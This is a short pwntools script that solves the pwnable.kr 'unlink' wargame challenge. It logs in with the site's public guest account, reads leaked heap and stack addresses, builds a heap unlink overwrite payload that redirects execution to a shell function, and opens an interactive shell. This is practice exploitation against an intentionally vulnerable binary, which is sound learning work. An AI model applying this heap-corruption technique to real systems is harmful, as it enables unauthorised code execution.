from pwn import *

"""
Exploit plan
payload = shell + (leak_heap+12) + "A" * 8 + (leak_heap+16) + unlink.ebp(leak_stack-0x1c)
"""

s = ssh(user="unlink", host="pwnable.kr", port=2222, password="guest")
p = s.process("/home/unlink/unlink")

shell = 0x80484eb

unlink_ebp = int(p.recvline()[-11:-1], 16) - 0x1c
leak_heap = int(p.recvline()[-11:-1], 16)
print(p.recvline())

pay = p32(shell)
pay += p32(leak_heap + 0xc)
pay += b"A" * 8
pay += p32(leak_heap + 0x10)
pay += p32(unlink_ebp)

p.sendline(pay)
p.interactive()
